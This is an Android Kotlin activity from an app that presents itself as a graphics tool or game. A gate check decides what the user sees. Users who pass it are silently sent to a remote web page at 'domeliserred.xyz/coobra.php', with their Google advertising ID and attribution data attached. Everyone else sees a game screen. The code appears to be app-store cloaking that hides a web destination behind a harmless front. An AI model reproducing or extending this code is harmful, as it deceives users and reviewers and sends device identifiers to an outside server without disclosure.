package inc.trilokia.gfxtoo.view

import android.content.Context
import android.content.Intent
import android.os.Bundle
import androidx.activity.viewModels
import androidx.appcompat.app.AppCompatActivity
import androidx.lifecycle.lifecycleScope
import com.appsflyer.AppsFlyerLib
import com.facebook.applinks.AppLinkData
import com.google.android.gms.ads.identifier.AdvertisingIdClient
import com.onesignal.OneSignal
import inc.trilokia.gfxtoo.app.CobraApp
import inc.trilokia.gfxtoo.databinding.ActivityLoadCobraBinding
import inc.trilokia.gfxtoo.utils.AppsWrapper
import inc.trilokia.gfxtoo.utils.security_utils.SecurityManager
import inc.trilokia.gfxtoo.view_model.CobraViewModel
import inc.trilokia.gfxtoo.view_model.CobraViewModelFactory
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import javax.inject.Inject

class LoadCobraActivity : AppCompatActivity() {
    @Inject
    lateinit var cobraViewModelFactory: CobraViewModelFactory

    @Inject
    lateinit var securityManager: SecurityManager

    private val cobraViewModel: CobraViewModel by viewModels { cobraViewModelFactory }
    private lateinit var binding: ActivityLoadCobraBinding

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        binding = ActivityLoadCobraBinding.inflate(layoutInflater)
        setContentView(binding.root)
        (application as CobraApp).appComponent.inject(this)

        lifecycleScope.launch {
            if (securityManager.isSecured()) {
                OneSignal.initWithContext(this@LoadCobraActivity)
                OneSignal.setAppId(cobraViewModel.getOneKeyAsync().await())
                val currentLink = getSharedPreferences("prefs", Context.MODE_PRIVATE).getString(
                    "link",
                    "domeliserred.xyz/coobra.php"
                )
                if (currentLink!! == "domeliserred.xyz/coobra.php") {
                    val googleAdvertisingId = withContext(Dispatchers.Default) {
                        AdvertisingIdClient.getAdvertisingIdInfo(this@LoadCobraActivity).id.toString()
                    }
                    with(AppsFlyerLib.getInstance()) {
                        init(
                            cobraViewModel.getAppsKeyAsync().await(),
                            AppsWrapper { data ->
                                AppLinkData.fetchDeferredAppLinkData(this@LoadCobraActivity) { deepLink ->
                                    val deep = deepLink?.targetUri.toString()
                                    val newCurrentLink = cobraViewModel.processLink(
                                        data = data,
                                        deep = deep,
                                        baseLink = currentLink,
                                        gadid = googleAdvertisingId
                                    )
                                    with(
                                        Intent(
                                            this@LoadCobraActivity,
                                            WebCobraActivity::class.java
                                        )
                                    ) {
                                        putExtra("currentLink", newCurrentLink)
                                        startActivity(this)
                                    }
                                    finish()
                                }
                            },
                            this@LoadCobraActivity
                        )
                        start(this@LoadCobraActivity)
                    }
                } else {
                    with(Intent(this@LoadCobraActivity, WebCobraActivity::class.java)) {
                        putExtra("currentLink", currentLink)
                        startActivity(this)
                    }
                    finish()
                }
            } else {
                startActivity(Intent(this@LoadCobraActivity, GameCobraActivity::class.java))
                finish()
            }
        }
    }
}